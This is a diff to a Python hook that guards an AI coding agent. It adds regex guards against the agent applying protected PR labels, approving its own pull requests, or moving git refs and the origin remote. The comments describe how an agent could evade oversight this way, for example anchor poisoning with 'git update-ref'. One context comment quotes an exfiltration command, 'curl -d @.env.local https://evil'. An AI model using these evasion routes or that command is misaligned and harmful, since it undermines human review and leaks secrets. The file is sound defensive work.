@@ -288,6 +288,273 @@ def _bash_targets_own_guard(scan: str) -> bool:
     return False
 
 
+# ── Protected-label guard: an acknowledgement is Braeden's to give ─────────────
+# Ported from claude-project-kit PR #40 (TOD-111, 2026-08-26). Flagged as a known
+# gap in #397's own PR body: this repo protects the WHOLE `.claude/hooks/`
+# directory, which is stricter than the kit — but the kit compensates with THIS
+# guard, and without it the strictness buys less than it looks like it does.
+#
+# `hooks-change` is the label that turns CI's "Hooks change guard" job green. A
+# session that can apply it acknowledges its own guard-machinery change — the one
+# thing that gate exists to prevent. `agent:*` / `blocked:*` / `provenance:*` are
+# dispatcher-owned by docs/PIPELINE-CONTRACT.md §6; the pipeline's lifecycle-label
+# guard already refuses them through a TRACKER MCP, but nothing stopped the same
+# write arriving as a `gh` command, which is the cheaper spelling.
+#
+# Scope, stated plainly: this is a first line over command SHAPES, and an
+# exhaustive denylist of shell spellings is not achievable. The durable half is
+# server-side — a workflow that checks WHO applied the label — and that is what
+# covers the spellings this regex will never see.
+PROTECTED_LABEL_PREFIXES = ("agent:", "blocked:", "provenance:")
+PROTECTED_LABEL_EXACT = ("hooks-change",)
+PROTECTED_LABEL_HELP = (
+    "🔒 `{label}` is a protected label — Claude may not apply or remove it. These "
+    "labels are acknowledgement and supervision, not status: `hooks-change` is how "
+    "BRAEDEN signs off that guard machinery changed, and `agent:*` / `blocked:*` / "
+    "`provenance:*` are dispatcher-owned (docs/PIPELINE-CONTRACT.md §6). A session "
+    "that labels its own PR is acknowledging its own change — the one thing that "
+    "gate exists to prevent. Do not reach for another tool or a shell workaround — "
+    "instead, print the command for Braeden to run himself, e.g.:\n"
+    "  gh pr edit <number> --add-label <the-label>\n"
+    "and let him run it. (Reading or listing labels is fine, and so is labelling "
+    "with an unrelated label such as `bug` — only the protected set is refused.)"
+)
+
+# Label-bearing `gh` subcommands, sliced to the next shell separator so a protected
+# label in a LATER chained command is still seen.
+_GH_LABEL_CMD_RE = re.compile(r"\bgh\s+(?:pr|issue)\s+(?:edit|create|new)\b([^#\n;&|]*)")
+# --add-label / --remove-label / --label / -l, in `--flag=v` and `--flag v` form.
+# gh accepts a comma-separated list in one flag, so the value is split on commas.
+_LABEL_FLAG_RE = re.compile(
+    r"(?<![\w-])(?:--(?:add-|remove-)?labels?|-l)(?:=|\s+)([\"'][^\"']*[\"']|[^\s;&|#]+)"
+)
+# The REST path that APPLIES labels to one issue/PR. `[^/\s'\"]+` so a shell variable
+# (…/issues/$N/labels) matches too. Repo-level label CRUD (`repos/o/r/labels`, which
+# is what `gh label create` calls) deliberately does NOT match: DEFINING a label is
+# setup, not acknowledgement.
+_GH_API_RE = re.compile(r"\bgh\s+api\b([^#\n;&|]*)")
+_API_ISSUE_LABELS_RE = re.compile(r"/issues/[^/\s'\"]+/labels\b")
+_API_WRITE_RE = re.compile(
+    r"(?<![\w-])-X\s*['\"]?(?:POST|PATCH|PUT|DELETE)"
+    r"|(?<![\w-])(?:-f|-F|--field|--raw-field|--input)(?![\w-])",
+    re.IGNORECASE,
+)
+
+
+def _is_protected_label(name: str) -> bool:
+    n = (name or "").strip().strip("\"'").strip().lower()
+    return bool(n) and (n in PROTECTED_LABEL_EXACT or n.startswith(PROTECTED_LABEL_PREFIXES))
+
+
+def _protected_label_in(cmd: str):
+    """The first protected label this command would APPLY or REMOVE via `gh`, else None.
+
+    Read paths never match: only the mutating label FLAGS and the issue-labels API
+    endpoint are inspected, so `gh pr view`, `gh label list` and `gh issue view
+    --json labels` stay frictionless. Labelling with an unrelated label is untouched
+    — the value itself has to be in the protected set."""
+    for m in _GH_LABEL_CMD_RE.finditer(cmd):
+        for f in _LABEL_FLAG_RE.finditer(m.group(1)):
+            for part in f.group(1).strip("\"'").split(","):
+                if _is_protected_label(part):
+                    return part.strip().strip("\"'")
+    for m in _GH_API_RE.finditer(cmd):
+        seg = m.group(1)
+        if not (_API_ISSUE_LABELS_RE.search(seg) and _API_WRITE_RE.search(seg)):
+            continue
+        for tok in re.findall(r"[\w:.-]+", seg):
+            if _is_protected_label(tok):
+                return tok
+        # A body this hook cannot read (`--input file`, piped stdin). The ENDPOINT is
+        # already label application, so fail CLOSED rather than wave an opaque payload
+        # through — hiding the label in a file is the obvious next spelling.
+        if re.search(r"(?<![\w-])--input(?![\w-])", seg):
+            return "<opaque --input payload>"
+    return None
+
+
+# ── PR self-approval guard: an approval is a SECOND pair of eyes, or it is nothing ──
+# Ported from claude-project-kit PR #50 / KIT-21 (TOD-111, 2026-08-26). Distinct from
+# the pipeline's `self-approval` guard below, which refuses a TRACKER state change into
+# `ready`; this one refuses a GitHub review. Same defect class, different surface.
+#
+# An approval is not a status bit. It is a claim to the next human that somebody ELSE
+# read this code. Measured rather than assumed: `braedensc/todoclaw` `main` requires 0
+# approving reviews, so an approval does not unlock a merge here today — it makes a
+# session's own PR read as reviewed to the person who then merges it by hand, which is
+# the failure that matters when he is tired. It is also one branch-protection setting
+# away from being a merge unlock.
+#
+# ONLY approve is refused, deliberately. A `--comment` review is ordinary writing and
+# is sometimes genuinely useful (an agent flagging its own uncertainty inline), and
+# `--request-changes` on your own PR is meaningless but harmless. Neither manufactures
+# a human signal, so the pattern is kept narrow enough to leave both reachable — and
+# wide enough that no spelling of approve slips past.
+_GH_PR_REVIEW_RE = re.compile(r"\bgh\s+pr\s+review\b([^#\n;&|]*)")
+_REVIEW_APPROVE_RE = re.compile(r"(?<![\w-])--approve(?![\w-])")
+_REVIEW_EVENT_RE = re.compile(r"(?<![\w-])--(?:approve|comment|request-changes)(?![\w-])")
+# pflag CLUSTERS shorthand flags, so `-a` need not be a token of its own: `gh pr
+# review -ab "lgtm"` approves just as well as `-a -b "lgtm"`. Collect the letters of
+# every single-dash token and look for the event shorthands among them (-a approve,
+# -c comment, -r request-changes). Long flags never match — the lookbehind rejects the
+# second dash of `--body` — and case is load-bearing, so `-R` (repo) is not `-r`.
+_SHORT_CLUSTER_RE = re.compile(r"(?<![\w-])-([a-zA-Z]+)(?![\w-])")
+# The REST endpoint that CREATES a review, plus the APPROVE event in its flag, JSON
+# and GraphQL spellings. Matched against the WHOLE command rather than only `gh api`:
+# *.github.com is on this repo's egress allowlist, so a plain `curl -X POST` aimed at
+# api.github.com is not stopped by anything else in this file.
+_PR_REVIEWS_PATH_RE = re.compile(r"/pulls/[^/\s'\"]+/reviews\b")
+_REVIEW_EVENT_FIELD_RE = re.compile(r"event[\"']?\s*[=:]", re.I)
+_APPROVE_EVENT_RE = re.compile(r"event[\"']?\s*[=:]\s*[\"']?\s*APPROVE(?![\w-])", re.I)
+_GRAPHQL_REVIEW_RE = re.compile(r"(?<![\w-])(?:add|submit)PullRequestReview(?![\w-])")
+
+SELF_APPROVAL_PR_HELP = (
+    "🔒 Approving a pull request is Braeden's action only — and a session approving "
+    "its OWN pull request is the whole point of this block. An approval is not a "
+    "status bit: it is a claim to the next reviewer that somebody else read the "
+    "code, and one branch-protection setting away from being the thing that unlocks "
+    "the merge. Claude cannot make that claim about its own work, for the same "
+    "reason it cannot merge a PR and cannot apply `hooks-change`. Do not reach for "
+    "another tool or a shell workaround — instead, print the command for Braeden to "
+    "run himself:\n"
+    "  gh pr review <number> --approve\n"
+    "and let him run it. {why}"
+)
+_SELF_APPROVAL_PR_WHY = {
+    "approve": "(A `--comment` review is still allowed, and so is `--request-changes` "
+               "— only APPROVE manufactures a signal a human is meant to produce. "
+               "Reading reviews, and `--add-reviewer` to ASK for one, are untouched.)",
+    "interactive": "(A bare `gh pr review` picks its event at an interactive prompt "
+                   "this hook cannot see, so it is refused too. Name the event you "
+                   "want: `gh pr review <number> --comment` is allowed.)",
+    "opaque": "(This is a write to the review-creation endpoint whose event lives in "
+              "a body this hook cannot read, so it fails closed. Pass the event as a "
+              "visible field instead of hiding it in a file.)",
+}
+
+
+def _self_approval_in(cmd: str):
+    """Why this command would APPROVE a pull request, else None.
+
+    Read paths never match: `gh pr view --json reviews`, a plain GET of the reviews
+    endpoint, and `--add-reviewer` (which REQUESTS a review rather than gives one)
+    all stay frictionless. `_strip_prose` has already blanked quoted `--body`/`-b`
+    values by the time this runs, so an approve flag merely NAMED inside review prose
+    is not mistaken for one handed to the parser."""
+    for m in _GH_PR_REVIEW_RE.finditer(cmd):
+        seg = m.group(1)
+        shorts = "".join(_SHORT_CLUSTER_RE.findall(seg))
+        if _REVIEW_APPROVE_RE.search(seg) or "a" in shorts:
+            return "approve"
+        # No event flag at all is the INTERACTIVE form, and the prompt it opens offers
+        # approve. Same call the label guard makes for an opaque payload: an unreadable
+        # event on a review-CREATING command fails closed.
+        if not (_REVIEW_EVENT_RE.search(seg) or "c" in shorts or "r" in shorts):
+            return "interactive"
+    if _APPROVE_EVENT_RE.search(cmd) and (
+            _PR_REVIEWS_PATH_RE.search(cmd) or _GRAPHQL_REVIEW_RE.search(cmd)):
+        return "approve"
+    for m in _GH_API_RE.finditer(cmd):
+        seg = m.group(1)
+        if not (_PR_REVIEWS_PATH_RE.search(seg) and _API_WRITE_RE.search(seg)):
+            continue
+        if not _REVIEW_EVENT_FIELD_RE.search(seg):
+            return "opaque"
+    return None
+
+
+# ── Config-anchor guard: the git ref store is a trust anchor, not scratch space ──
+# Ported from claude-project-kit PR #39 (TOD-111, 2026-08-26); upstream ADR
+# 2026-08-24-config-anchor-and-pin-expiry. This repo ALREADY reads config from the
+# default branch (see _CONFIG_REFS / _read_delivery_config) and already fails closed
+# on an EXPIRED pin while failing open on an ABSENT one (see _read_pin). What was
+# missing is the half that makes those two properties mean anything: nothing stopped
+# a session from MOVING the ref they read from.
+#
+# Several guards deliberately read a value from the DEFAULT BRANCH rather than from
+# the agent's worktree: the pipeline's `delivery.json` (_read_delivery_config), the
+# merged-PR guard's base ref, the changed-file set a CI review is judged against. The
+# whole point of reading `origin/main` instead of the working tree is that the working
+# tree is model-writable — which only holds while the REF is not. A plain local ref is
+# rewritable by one `git update-ref`, so a session that can move `main`/`origin/main`
+# to a commit of its own making CHOOSES the config every one of those guards then
+# reads, `dispatch.pinsRoot` included — and that is where the pin lives. Anchor
+# poisoning is the entire escalation in one command.
+#
+# So the ref store is human-only, the same way the hook files are. What is blocked is
+# WRITING a protected ref, or repointing the remote a protected ref comes from. Every
+# read (`git log origin/main`, `git diff origin/main...HEAD`) and the one honest
+# writer (`git fetch`, which copies the ref from the real remote) stay allowed — a
+# guard that stopped `git fetch` would stop the repo from learning the truth.
+#
+# TAMPER-EVIDENT, NOT TAMPER-PROOF — the same posture docs/PIPELINE-CONTRACT.md §3
+# states for the pin itself. A shell cannot be perfectly fenced by regex; what this
+# buys is that the cheap, silent, single-command version of the attack is gone, and
+# the backstop stays what it always was: nothing lands without a reviewed PR + CI.
+_PROTECTED_REF = r"(?:refs/(?:heads|remotes/[^\s'\"/]+)/)?(?:main|master)(?![\w./-])"
+# The `.git/**` metadata that DECIDES what a ref resolves to. Reads are untouched; the
+# operator scaffold is the same one the self-edit guard uses (see _mutate_re).
+_GIT_STORE = (r"\.git[/\\](?:refs[/\\][^\s'\"|&;<>]*|packed-refs|config|HEAD"
+              r"|logs[/\\][^\s'\"|&;<>]*|worktrees[/\\][^\s'\"|&;<>]*)")
+_GIT_STORE_MUTATE_RE = _mutate_re(_GIT_STORE)
+_REF_WRITE_RES = (
+    # These verbs exist to change what a name resolves to. None of them appears in
+    # this repo's workflow, so they are blocked outright rather than by target. The
+    # lookarounds keep the verb from matching inside a PATH or a flag value
+    # (`git show HEAD:src/replace.ts`, `git log --grep=replace`, `git checkout
+    # replace-me`) — the same targeting discipline the guards above use.
+    re.compile(r"\bgit\b[^|;&]*?(?<![\w./=-])"
+               r"(?:update-ref|replace|fast-import|filter-branch)(?![\w./-])"),
+    re.compile(r"\bgit\b[^|;&]*\bsymbolic-ref\b[^|;&]*" + _PROTECTED_REF),
+    # `git branch -f/-M/-D/-d/-m main` — force-move or delete a protected branch.
+    # The flag must be its OWN token, so the read-only spellings that merely mention
+    # the branch (`git branch --merged main`, `--contains main`) do not match. The
+    # documented codename rename (`git branch -m fix/…`) carries no protected ref and
+    # is therefore untouched.
+    re.compile(r"\bgit\b[^|;&]*\bbranch\b[^|;&]*"
+               r"(?:(?<=\s)-[a-zA-Z]*[fMDdm](?=[\s'\"]|$)|--force\b|--delete\b|--move\b)"
+               r"[^|;&]*(?<![\w./-])" + _PROTECTED_REF),
+    # A fetch/pull REFSPEC (`<src>:<dst>`) whose destination is a protected ref — how
+    # a hostile remote gets copied over origin/main. A plain `git fetch origin main`
+    # carries no colon and stays allowed, and an SSH URL (`git@host:main/repo.git`)
+    # cannot match: the ref lookahead excludes `/`.
+    re.compile(r"\bgit\b[^|;&]*\b(?:fetch|pull)\b[^|;&]*:" + _PROTECTED_REF),
+    # Repointing `origin` itself and then fetching reaches the same place. `add` is
+    # deliberately NOT here: git refuses to add a remote that already exists, so it
+    # cannot repoint an anchor — repointing needs `remove` or `set-url` first, and
+    # both are blocked. That keeps first-push bootstrap (`git remote add origin …`)
+    # working, which is the one time a human legitimately types this.
+    re.compile(r"\bgit\b[^|;&]*\bremote\b[^|;&]*"
+               r"\b(?:set-url|set-head|rename|remove|rm)\b"
+               r"[^|;&]*(?<![\w.-])origin(?![\w.-])"),
+)
+_GIT_CONFIG_REMOTE_RE = re.compile(
+    r"\bgit\b[^|;&]*\bconfig\b[^|;&]*(?<![\w.-])remote\.origin\.url(?![\w.-])")
+_GIT_CONFIG_READ_RE = re.compile(r"(?:^|\s)--(?:get|get-all|get-regexp|list)\b")
+CONFIG_ANCHOR_HELP = (
+    "🔒 That command would rewrite a git ref — or the remote a ref comes from — that "
+    "this hook suite TRUSTS. Guards deliberately read values from the default branch "
+    "instead of your worktree (`delivery.json`, the merged-PR base, the changed-file "
+    "set a review is judged against), so a session that can move `main`/`origin/main` "
+    "picks the values that judge it — `dispatch.pinsRoot` included, which is where "
+    "the dispatcher pin lives. Moving a protected ref, repointing `origin`, or "
+    "writing into `.git/` is Braeden's action at a terminal. Reads (`git log`, "
+    "`git diff origin/main...HEAD`) and a plain `git fetch` are untouched."
+)
+
+
+def _in_git_store(path: str) -> bool:
+    """True when `path` lands inside ANY `.git` directory — the Edit/Write twin of
+    _GIT_STORE_MUTATE_RE. Component-wise, so `.gitignore` and `.github/` (which only
+    *start* with `.git`) are never caught."""
+    if not path:
+        return False
+    try:
+        parts = os.path.abspath(path).replace(os.sep, "/").split("/")
+    except Exception:
+        return True  # unresolvable path → fail CLOSED
+    return ".git" in parts
+
 # ── Egress guard: block obvious outbound exfiltration ───────────────────────────
 # GAP 3 (audit 2026-07-06). The supply-chain guard below stops `curl … | bash`
 # (inbound), but nothing stopped OUTBOUND exfil like `curl -d @.env.local https://evil`
@@ -1237,6 +1504,10 @@ def _dispatch(data):
         _p = inp.get("file_path") or inp.get("notebook_path") or ""
         if _is_self_guard_path(_p):
             block(SELF_EDIT_HELP.format(path=_p))
+        # The git metadata store is part of the config anchor: a ref file rewritten
+        # with Edit/Write moves it exactly as `git update-ref` would.
+        if _in_git_store(_p):
+            block(CONFIG_ANCHOR_HELP)
 
     # ── Cross-worktree write guard ──────────────────────────────────────────────
     if tool in ("Edit", "Write"):
@@ -1315,6 +1586,16 @@ def _dispatch(data):
         if _bash_targets_own_guard(scan):
             block(SELF_EDIT_BASH_HELP)
 
+        # ── Config-anchor guard (Bash arm) — TOD-111 ────────────────────────────
+        # Writing a protected ref, repointing `origin`, or mutating `.git/**` is
+        # human-only (see CONFIG_ANCHOR_HELP). `git config --get remote.origin.url`
+        # is a read and stays allowed, as does a plain `git fetch`.
+        if (_GIT_STORE_MUTATE_RE.search(scan)
+                or any(_r.search(scan) for _r in _REF_WRITE_RES)
+                or (_GIT_CONFIG_REMOTE_RE.search(scan)
+                    and not _GIT_CONFIG_READ_RE.search(scan))):
+            block(CONFIG_ANCHOR_HELP)
+
         # Block staging planning/ or real .env files
         if re.search(r"\bgit\s+add\b[^#\n;&|]*(planning/|\.env(?!\.example))", scan):
             block(
@@ -1356,6 +1637,21 @@ def _dispatch(data):
                 "(`gh pr merge --disable-auto` is still allowed, to undo an auto-merge "
                 "that shouldn't have been enabled.)"
             )
+
+        # ── PR self-approval guard — TOD-111 ────────────────────────────────────
+        # Approving a pull request is a SIGNAL TO A HUMAN that someone else looked
+        # at the work — the same class of action as merging it, and the same answer.
+        _approval = _self_approval_in(scan)
+        if _approval:
+            block(SELF_APPROVAL_PR_HELP.format(why=_SELF_APPROVAL_PR_WHY[_approval]))
+
+        # ── Protected-label guard — TOD-111 ─────────────────────────────────────
+        # Applying (or removing) a protected label is an ACKNOWLEDGEMENT, and an
+        # acknowledgement is Braeden's action for the same reason a merge is: it
+        # grants permission to the very change the session is proposing.
+        _bad_label = _protected_label_in(scan)
+        if _bad_label:
+            block(PROTECTED_LABEL_HELP.format(label=_bad_label))
 
         # ── Secret-file read/source guard (Bash) — GAP 2 ────────────────────────
         # Target the sensitive PATH, not a list of reader verbs (see SENSITIVE_PATH_RE).
